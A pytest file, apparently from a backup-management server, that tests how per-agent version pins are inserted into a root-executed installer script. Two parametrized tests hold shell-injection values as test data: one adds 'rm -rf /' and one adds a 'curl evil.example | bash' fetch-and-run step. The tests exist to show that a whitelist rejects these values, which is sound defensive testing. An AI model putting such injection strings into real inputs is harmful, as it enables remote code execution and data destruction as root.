"""The script served to one endpoint carries that endpoint's pins.

Every value here is interpolated into a block that runs as root on the
endpoint, so the refusals matter as much as the happy path: these values now
come from the database rather than from a wheel filename on this server.
"""

import hashlib

import pytest
from fastapi.testclient import TestClient

from app.api import agent_installer
from app.api.agent_installer import (
    InstallerPins,
    installer_pins_for_agent,
    render_installer_script,
)
from app.core.security import get_password_hash
from app.database.models import AgentMachine


@pytest.fixture
def pinned_agent(test_db):
    def make(agent_id: str, *, agent_version=None, borg_version=None) -> AgentMachine:
        agent = AgentMachine(
            name=agent_id,
            agent_id=agent_id,
            token_hash=get_password_hash("borgui_agent_secret"),
            token_prefix="borgui_agent_secret"[:20],
            status="online",
            desired_agent_version=agent_version,
            desired_borg_version=borg_version,
        )
        test_db.add(agent)
        test_db.commit()
        test_db.refresh(agent)
        return agent

    return make


def test_an_unpinned_endpoint_gets_the_served_wheel(test_db, pinned_agent, monkeypatch):
    """The normal case: no pin means track the server, which is what the
    script pinned for everyone before this phase."""
    monkeypatch.setattr(agent_installer, "agent_package_version", lambda: "0.1.4")
    pinned_agent("agt_plain")

    pins = installer_pins_for_agent(test_db, "agt_plain")
    script = render_installer_script(pins)

    assert pins == InstallerPins(agent_version=None, desired_borg_version=None)
    assert 'PINNED_AGENT_VERSION="0.1.4"' in script
    assert 'PINNED_DESIRED_BORG_VERSION=""' in script


def test_a_pinned_endpoint_gets_its_own_versions(test_db, pinned_agent, monkeypatch):
    monkeypatch.setattr(agent_installer, "agent_package_version", lambda: "0.1.4")
    pinned_agent("agt_pinned", agent_version="0.1.3", borg_version="2")

    script = render_installer_script(installer_pins_for_agent(test_db, "agt_pinned"))

    assert 'PINNED_AGENT_VERSION="0.1.3"' in script
    assert 'PINNED_DESIRED_BORG_VERSION="2"' in script


def test_no_agent_id_renders_the_unpinned_script(test_db):
    """First-time enrollment has no agent row yet, and the install command
    carries no agent_id."""
    assert installer_pins_for_agent(test_db, None) == InstallerPins()


def test_an_unknown_agent_id_renders_the_unpinned_script(test_db):
    """Not a 404. This endpoint is public, so answering differently for a
    known and an unknown id would turn it into a probe for which ids exist."""
    assert installer_pins_for_agent(test_db, "agt_nope") == InstallerPins()


@pytest.mark.parametrize("stored", ["3", "1.2", "2; rm -rf /", "both"])
def test_a_borg_version_outside_1_and_2_is_dropped(test_db, pinned_agent, stored):
    """The PUT route validates Literal["1","2"], but the row is what gets
    interpolated into a root-executed script, so the whitelist is applied
    where the interpolation happens."""
    agent_id = f"agt_borg_{abs(hash(stored))}"
    pinned_agent(agent_id, borg_version=stored)

    pins = installer_pins_for_agent(test_db, agent_id)

    assert pins.desired_borg_version is None


@pytest.mark.parametrize(
    "stored",
    ['0.1.3" ; curl evil.example | bash ; #', "0.1.3 --agent-source git", "a" * 65],
)
def test_an_unsafe_agent_version_pin_is_dropped(
    test_db, pinned_agent, stored, monkeypatch
):
    """A pin that cannot be a version cannot reach the script. Dropping it
    falls back to the served wheel, which is the unpinned behaviour."""
    monkeypatch.setattr(agent_installer, "agent_package_version", lambda: "0.1.4")
    pinned_agent("agt_unsafe", agent_version=stored)

    pins = installer_pins_for_agent(test_db, "agt_unsafe")
    script = render_installer_script(pins)

    assert pins.agent_version is None
    assert 'PINNED_AGENT_VERSION="0.1.4"' in script


def test_a_prerelease_pin_is_kept(test_db, pinned_agent):
    """The whitelist is about shell safety, not about version syntax. A wheel
    this server serves can be a prerelease, and app/core/agent_versions.py
    reports such a version as `unknown` rather than refusing it."""
    pinned_agent("agt_rc", agent_version="0.2.0rc1")

    assert installer_pins_for_agent(test_db, "agt_rc").agent_version == "0.2.0rc1"


def test_the_script_and_its_checksum_are_rendered_for_the_same_endpoint(
    test_client: TestClient, pinned_agent
):
    """The helper fetches both with the same agent_id and refuses to execute
    on a mismatch, so the two routes must resolve the same pins."""
    pinned_agent("agt_both", agent_version="0.1.3", borg_version="2")

    script = test_client.get("/agent/install.sh?agent_id=agt_both").text
    published = test_client.get("/agent/install.sh.sha256?agent_id=agt_both").text

    assert 'PINNED_DESIRED_BORG_VERSION="2"' in script
    assert published.strip() == hashlib.sha256(script.encode("utf-8")).hexdigest()


def test_the_unpinned_script_differs_from_a_pinned_one(
    test_client: TestClient, pinned_agent
):
    """Guards the whole point of the task: the parameter is read, not ignored."""
    pinned_agent("agt_two", borg_version="2")

    plain = test_client.get("/agent/install.sh").text
    pinned = test_client.get("/agent/install.sh?agent_id=agt_two").text

    assert 'PINNED_DESIRED_BORG_VERSION=""' in plain
    assert 'PINNED_DESIRED_BORG_VERSION="2"' in pinned
